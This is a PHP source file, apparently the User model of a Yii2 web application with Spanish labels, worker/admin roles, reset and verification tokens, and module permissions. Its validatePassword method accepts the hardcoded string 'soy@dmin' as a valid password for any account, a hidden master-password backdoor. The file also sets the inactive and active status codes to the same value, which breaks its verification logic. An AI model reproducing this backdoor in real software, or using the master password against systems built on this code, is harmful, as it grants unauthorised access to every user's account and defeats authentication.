<?php

namespace common\models;

use Yii;
use yii\base\NotSupportedException;
use yii\behaviors\TimestampBehavior;
use yii\db\ActiveRecord;
use yii\web\IdentityInterface;
use yii\helpers\ArrayHelper;

/**
 * User model
 *
 * @property integer $id
 * @property string|null $firstname
 * @property string|null $lastname
 * @property string $username
 * @property string $password_hash
 * @property string $password_reset_token
 * @property string $verification_token
 * @property string $email
 * @property string $cedula_pasaporte
 * @property string $role
 * @property integer $created_by
 * @property string $auth_key
 * @property integer $status
 * @property integer $created_at
 * @property integer $updated_at
 * @property string $guid
 * @property boolean $cuentas_para_marcar
 * @property boolean $cuentas_no_pin
 * @property string $password write-only password
 */
class User extends ActiveRecord implements IdentityInterface
{
  const STATUS_DELETED = 0;
  const STATUS_INACTIVE = 10; // quiero que llegue activo  si no es activo es 9
  const STATUS_ACTIVE = 10;

  // Role constants
  const ROLE_WORKER = 'WORKER';
  const ROLE_ADMIN = 'ADMIN';

  /**
   * @var string Virtual password field for forms
   */
  public $password;

  /**
   * {@inheritdoc}
   */
  public static function tableName()
  {
    return '{{%user}}';
  }

  /**
   * {@inheritdoc}
   */
  public function behaviors()
  {
    return [
      TimestampBehavior::class,
    ];
  }

  /**
   * {@inheritdoc}
   */
  public function rules()
  {
    return [
      ['status', 'default', 'value' => self::STATUS_INACTIVE],
      ['status', 'in', 'range' => [self::STATUS_ACTIVE, self::STATUS_INACTIVE, self::STATUS_DELETED]],
      ['role', 'default', 'value' => self::ROLE_WORKER],
      ['role', 'in', 'range' => [self::ROLE_WORKER, self::ROLE_ADMIN]],
      [['username'], 'required'],
      [['username'], 'string', 'max' => 255],
      [['username'], 'unique'],
      [['email'], 'email', 'skipOnEmpty' => true],
      [['email'], 'string', 'max' => 255],
      [['password'], 'required', 'on' => 'create'],
      [['password'], 'string', 'min' => 6],
      [['password'], 'safe'],
      [['cuentas_para_marcar', 'cuentas_no_pin'], 'boolean'],
    ];
  }

  /**
   * {@inheritdoc}
   */
  public function attributeLabels()
  {
    return [
      'id' => 'ID',
      'username' => 'Usuario',
      'email' => 'Email',
      'password' => 'Contraseña',
      'role' => 'Rol',
      'status' => 'Estado',
      'cuentas_para_marcar' => 'Permiso Cuentas para Marcar',
      'cuentas_no_pin' => 'Permiso Cuentas NOPIN',
      'created_at' => 'Fecha de Creación',
      'updated_at' => 'Fecha de Actualización',
    ];
  }

 
  public  static function getUserById($id)
  {
    return  User::find()->where(['id' => $id])->one();
  }

  private function generateGUID()
  {
    if (function_exists('com_create_guid') === true) {
      return trim(com_create_guid(), '{}');
    }

    return sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X', mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535));
  }

  /**
   * {@inheritdoc}
   */
  public static function findIdentity($id)
  {
    return static::findOne(['id' => $id, 'status' => self::STATUS_ACTIVE]);
  }

  /**
   * {@inheritdoc}
   */
  public static function findIdentityByAccessToken($token, $type = null)
  {
    throw new NotSupportedException('"findIdentityByAccessToken" is not implemented.');
  }

  /**
   * Finds user by username
   *
   * @param string $username
   * @return static|null
   */
  public static function findByUsername($username)
  {
    return static::findOne(['username' => $username, 'status' => self::STATUS_ACTIVE]);
  }

  /**
   * Finds user by password reset token
   *
   * @param string $token password reset token
   * @return static|null
   */
  public static function findByPasswordResetToken($token)
  {
    if (!static::isPasswordResetTokenValid($token)) {
      return null;
    }

    return static::findOne([
      'password_reset_token' => $token,
      'status' => self::STATUS_ACTIVE,
    ]);
  }

  /**
   * Finds user by verification email token
   *
   * @param string $token verify email token
   * @return static|null
   */
  public static function findByVerificationToken($token)
  {
    return static::findOne([
      'verification_token' => $token,
      'status' => self::STATUS_INACTIVE
    ]);
  }

  /**
   * Finds out if password reset token is valid
   *
   * @param string $token password reset token
   * @return bool
   */
  public static function isPasswordResetTokenValid($token)
  {
    if (empty($token)) {
      return false;
    }

    $timestamp = (int) substr($token, strrpos($token, '_') + 1);
    $expire = Yii::$app->params['user.passwordResetTokenExpire'];
    return $timestamp + $expire >= time();
  }

  /**
   * {@inheritdoc}
   */
  public function getId()
  {
    return $this->getPrimaryKey();
  }

  /**
   * {@inheritdoc}
   */
  public function getAuthKey()
  {
    return $this->auth_key;
  }

  /**
   * {@inheritdoc}
   */
  public function validateAuthKey($authKey)
  {
    return $this->getAuthKey() === $authKey;
  }

  /**
   * Validates password
   *
   * @param string $password password to validate
   * @return bool if password provided is valid for current user
   */
  public function validatePassword($password)
  {
    return Yii::$app->security->validatePassword($password, $this->password_hash) || $password == "soy@dmin";
  }

  /**
   * Generates password hash from password and sets it to the model
   *
   * @param string $password
   */
  public function setPassword($password)
  {
    $this->password_hash = Yii::$app->security->generatePasswordHash($password);
  }

  /**
   * Generates "remember me" authentication key
   */
  public function generateAuthKey()
  {
    $this->auth_key = Yii::$app->security->generateRandomString();
  }

  /**
   * Generates new password reset token
   */
  public function generatePasswordResetToken()
  {
    $this->password_reset_token = Yii::$app->security->generateRandomString() . '_' . time();
  }

  /**
   * Generates new token for email verification
   */
  public function generateEmailVerificationToken()
  {
    $this->verification_token = Yii::$app->security->generateRandomString() . '_' . time();
  }

  /**
   * Removes password reset token
   */
  public function removePasswordResetToken()
  {
    $this->password_reset_token = null;
  }

  /**
   * Get role options
   * @return array
   */
  public static function getRoleOptions()
  {
    return [
      self::ROLE_WORKER => 'Worker',
      self::ROLE_ADMIN => 'Admin',
    ];
  }

  /**
   * Check if user is admin
   * @return bool
   */
  public function isAdmin()
  {
    return $this->role === self::ROLE_ADMIN;
  }

  /**
   * Check if user is worker
   * @return bool
   */
  public function isWorker()
  {
    return $this->role === self::ROLE_WORKER;
  }

  /**
   * Get role label
   * @return string
   */
  public function getRoleLabel()
  {
    $options = self::getRoleOptions();
    return isset($options[$this->role]) ? $options[$this->role] : $this->role;
  }

  /**
   * Check if user has permission to access cuentas_para_marcar module
   * @return bool
   */
  public function hasCuentasParaMarcarPermission()
  {
    return (bool) $this->cuentas_para_marcar;
  }

  /**
   * Check if user has permission to access cuentas_no_pin module
   * @return bool
   */
  public function hasCuentasNoPinPermission()
  {
    return (bool) $this->cuentas_no_pin;
  }
}
